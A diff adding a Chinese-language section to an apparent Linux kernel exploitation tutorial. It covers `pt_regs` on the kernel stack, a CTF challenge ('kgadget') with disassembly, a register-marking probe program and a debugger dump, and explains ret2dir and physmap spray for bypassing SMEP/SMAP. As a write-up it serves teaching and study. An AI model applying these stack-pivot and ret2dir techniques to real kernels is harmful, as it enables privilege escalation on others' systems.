@@ -485,4 +485,229 @@ void get_root(void) {
 
 ---
 
-## pt-regs
+# pt_regs
+
+可以进一步考虑内核栈的结构，即是否有用户可控的数据会被布置到内核栈的某个地方？关注系统调用在 kernel 中的入口函数 [entry_SYSCALL_64](https://elixir.bootlin.com/linux/v6.11/source/arch/x86/entry/entry_64.S#L87)，就能发现 `call do_syscall_64` 之前会先在内核栈上布置 `pt_regs` 结构体，其[定义](https://elixir.bootlin.com/linux/v6.11/source/arch/x86/include/uapi/asm/ptrace.h#L44)为：
+
+```c
+struct pt_regs {
+/*
+ * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
+ * unless syscall needs a complete, fully filled "struct pt_regs".
+ */
+	unsigned long r15;
+	unsigned long r14;
+	unsigned long r13;
+	unsigned long r12;
+	unsigned long rbp;
+	unsigned long rbx;
+/* These regs are callee-clobbered. Always saved on kernel entry. */
+	unsigned long r11;
+	unsigned long r10;
+	unsigned long r9;
+	unsigned long r8;
+	unsigned long rax;
+	unsigned long rcx;
+	unsigned long rdx;
+	unsigned long rsi;
+	unsigned long rdi;
+/*
+ * On syscall entry, this is syscall#. On CPU exception, this is error code.
+ * On hw interrupt, it's IRQ number:
+ */
+	unsigned long orig_rax;
+/* Return frame for iretq */
+	unsigned long rip;
+	unsigned long cs;
+	unsigned long eflags;
+	unsigned long rsp;
+	unsigned long ss;
+/* top of stack page */
+};
+```
+
+即系统调用的入口处会在 **内核栈底** 保存用户态的一系列寄存器，构成 `pt_regs` 结构体，这就给漏洞利用带来了便利。
+
+> [!Attention] 
+> 在内核版本 5.13 之前 `pt_regs` 结构体和栈顶的偏移值基本是固定的（**因为内核栈只有一个 page**），通常可以借助 `add rsp, val ; ret` 的 gadget 劫持一处函数指针就能实现进一步 ROP 利用。
+>
+> 但是，在 5.13 及之后的 `do_syscall_64` 函数入口处，新增了一行 [`add_random_kstack_offset();`](https://elixir.bootlin.com/linux/v5.13-rc1/source/arch/x86/entry/common.c#L41)，来源于 [2021 年 的一个 commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14)，效果是在栈底的 `pt_regs` 之上放了一个不超过 0x3FF 的偏移，使得利用的稳定性大幅下降。
+
+---
+
+# Chal-0x04: kgadget
+
+- 附件：[Google Drive](https://drive.google.com/file/d/1Uh6ahhVQDHzgc7JbHm-MahbqPSnj-FwF/view?usp=sharing)
+
+> [!INFO] 
+> 这是一道标准的 ret2dir 例题，其中也需要借助 `pt_regs` 来完成栈迁移。
+
+题目的 kgadget.ko 中只有一个 ioctl 是有用的，里面先对 rdx 解引用，再清空了栈上部分内容（其实这里就是 `pt_regs` 结构体的区域），最后将控制流跳转到 rdx 解引用得到的地址：
+
+```c
+param = rdx;
+    mov     rbx, [param];
+    mov     [rbp-18h], rsp;
+    mov     rax, [rbp-18h];
+    mov     rdi, offset unk_3F8;
+    add     rax, 1000h;
+    and     rax, 0FFFFFFFFFFFFF000h;
+    lea     rdx, [rax-0A8h];
+    mov     [rbp-18h], rdx;
+regs = rdx;
+    mov     regs, 3361626E74747261h;
+    mov     [rax-0A8h], rdx;
+    mov     [rax-0A0h], rdx;
+    mov     [rax-98h], rdx;
+    mov     [rax-90h], rdx;
+    mov     [rax-88h], rdx;
+    mov     [rax-80h], rdx;
+    mov     [rax-70h], rdx;
+    call    __x86_indirect_thunk_rbx;
+```
+
+这里就存在两个问题：
+
+> [!Question]
+> `pt_regs` 还剩下哪些东西可以用？
+
+先随便给一个合法地址，断点下到 `kgadget_base + 0x19A`，给每个寄存器打上标记后触发 ioctl：
+
+```c
+// author: @eastXueLian
+// usage : eval $buildPhase
+// You can refer to my nix configuration for detailed information.
+
+#include "libLian.h"
+
+extern size_t user_cs, user_ss, user_rflags, user_sp;
+
+int fd;
+
+int main() {
+    save_status();
+
+    fd = open("/dev/kgadget", 2);
+
+    __asm__("mov r15, 0xbeefdead;"
+            "mov r14, 0x11111111;"
+            "mov r13, 0x22222222;"
+            "mov r12, 0x33333333;"
+            "mov rbp, 0x44444444;"
+            "mov rbx, 0x55555555;"
+            "mov r11, 0x66666666;"
+            "mov r10, 0x77777777;"
+            "mov r9, 0x88888888;"
+            "mov r8, 0x99999999;"
+            "mov rcx, 0xaaaaaaaa;");
+
+    ioctl(fd, 114514, 0xffffffff81c01310);
+
+    return 0;
+}
+```
+
+这时候看栈底就能找到一长串的标记值：
+
+```c
+0e:0070│+058 0xffffc9000022ff50 —▸ 0xffffffff81c0008c ◂— 0x9c8b4c58244c8b48
+0f:0078│+060 0xffffc9000022ff58 ◂— 0x3361626e74747261 ('arttnba3')
+10:0080│+068 0xffffc9000022ff60 ◂— 0x3361626e74747261 ('arttnba3')
+... ↓     4 skipped
+15:00a8│+090 0xffffc9000022ff88 ◂— 0x246
+16:00b0│+098 0xffffc9000022ff90 ◂— 0x3361626e74747261 ('arttnba3')
+17:00b8│+0a0 0xffffc9000022ff98 ◂— 0x88888888
+18:00c0│+0a8 0xffffc9000022ffa0 ◂— 0x99999999
+19:00c8│+0b0 0xffffc9000022ffa8 ◂— 0xffffffffffffffda
+1a:00d0│+0b8 0xffffc9000022ffb0 —▸ 0x41a1cd ◂— 0x77fffff0003dc289
+1b:00d8│+0c0 0xffffc9000022ffb8 —▸ 0xffffffff81c01310 ◂— 0x480824748b4856fc
+1c:00e0│+0c8 0xffffc9000022ffc0 ◂— 0x1bf52
+1d:00e8│+0d0 0xffffc9000022ffc8 ◂— 0x3
+1e:00f0│+0d8 0xffffc9000022ffd0 ◂— 0x10
+1f:00f8│+0e0 0xffffc9000022ffd8 —▸ 0x41a1cd ◂— 0x77fffff0003dc289
+20:0100│+0e8 0xffffc9000022ffe0 ◂— 0x33 /* '3' */
+21:0108│+0f0 0xffffc9000022ffe8 ◂— 0x246
+22:0110│+0f8 0xffffc9000022fff0 —▸ 0x7ffcde93d670 ◂— 0x10
+23:0118│+100 0xffffc9000022fff8 ◂— 0x2b /* '+' */
+```
+
+即只留下了 r8、r9 两个寄存器可用，这时候就可以布置 `pop rsp ; ret` 来完成栈迁移。
+
+> [!Question]
+> 题目开启了 smep / smap 保护，ROP 链和 RDX 参数该怎么布置？
+
+在当前情况下，RDX 需要是指向存放内核代码段（gadget）地址的指针，内核中并不直接存在这种能够利用的函数指针，用户态的数据也由于保护的存在用不了，这时候就可以想到 ret2dir 技术。
+
+## RET2DIR + Physmap Spray
+
+该技术最初于 2014 年[提出](https://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf)，被用于绕过 SMEP / SMAP 等隔离保护，攻击的点在于内核态和用户态的虚拟地址可能会被映射到同一块物理地址上，而通过虚拟地址隔离实现的保护就此可以被绕过。
+
+Ret2dir 中的 dir 就是指内核内存空间中的直接映射区，关注 [linux 官方文档中的 Linux Kernel Memory Map](https://elixir.bootlin.com/linux/v6.11/source/Documentation/arch/x86/x86_64/mm.rst) 也可以注意到这一块位于 `0xffff888000000000 - 0xffffc87fffffffff` 的 Direct Mapping Area：
+
+```c
+  ========================================================================================================================
+      Start addr    |   Offset   |     End addr     |  Size   | VM area description
+  ========================================================================================================================
+                    |            |                  |         |
+   0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
+  __________________|____________|__________________|_________|___________________________________________________________
+                    |            |                  |         |
+   0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical
+                    |            |                  |         |     virtual memory addresses up to the -128 TB
+                    |            |                  |         |     starting offset of kernel mappings.
+  __________________|____________|__________________|_________|___________________________________________________________
+                                                              |
+                                                              | Kernel-space virtual memory, shared between all processes:
+  ____________________________________________________________|___________________________________________________________
+                    |            |                  |         |
+   ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
+   ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
+   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
+   ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
+   ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
+   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
+   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
+   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
+   ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
+  __________________|____________|__________________|_________|____________________________________________________________
+                                                              |
+                                                              | Identical layout to the 56-bit one from here on:
+  ____________________________________________________________|____________________________________________________________
+                    |            |                  |         |
+   fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
+                    |            |                  |         | vaddr_end for KASLR
+   fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
+   fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
+   ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
+   ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
+   ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
+   ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
+   ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0
+   ffffffff80000000 |-2048    MB |                  |         |
+   ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
+   ffffffffff000000 |  -16    MB |                  |         |
+      FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset
+   ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
+   ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
+  __________________|____________|__________________|_________|___________________________________________________________
+```
+
+对于 DMA，这段长达 64T 的虚拟内存空间直接映射了所有内存空间，即从 `page_offset_base` 到 `page_offset_base + 
+MAX_MEMORY_SIZE` 的内存直接对应了整个物理地址空间。
+
+这也就意味着除了直接 Direct Mapping Area 以外的所有虚拟内存空间在 Direct Mapping Area 内都必然存在一个对应的内存页，也就是其他虚拟内存对应的物理地址在 Direct Mapping Area 的映射，两块虚拟内存页对应着同一块物理内存页。
+
+> [!Info] 
+> 然而，这些映射关系并不要求所有映射到同一物理页的虚拟页具有相同的访问权限。例如：
+> - Linux Kernel Text 段：内核的代码段通常具有 r-x（可读、可执行）权限。这确保了内核代码可以被执行，但不允许修改，以保护内核的完整性。
+> - Direct Map 区域：在 Linux 内核中，直接映射区（Direct Mapping Area）用于将物理内存直接映射到内核的虚拟地址空间中。在这个区域中，对应于内核文本段的物理页可能仅具有 r__（只读）权限。这意味着即使这些物理页在直接映射区中被访问，它们也只能被读取，不能被修改或执行。
+>
+> *当然也可以用 USMA 等方法重新映射新的内存页绕过这种限制*
+
+上述设计也是 ret2dir 攻击手段的基本原理，通常借助的是用户态 mmap 出来的内存可以在 Direct Mapping Area 找到的性质：
+
+1. 利用 mmap 在用户空间大量喷射内存；
+2. 由于 kmalloc 得到的堆块通常也来源于这块直接映射区，就可以通过泄漏内核堆拿到相关地址；
+3. 基于泄漏得到的处于 Direct Mapping Area 的堆地址进行内存搜索，就可以稳定拿到用户态喷射的内存；
+
+在大部分情况下并没有内存搜索的能力，这时候就可以采用 `Physmap Spray` 的手段布置大量同样的 payload，后随机选取一块合适的位于 Direct Mapping Area 的地址以求命中。
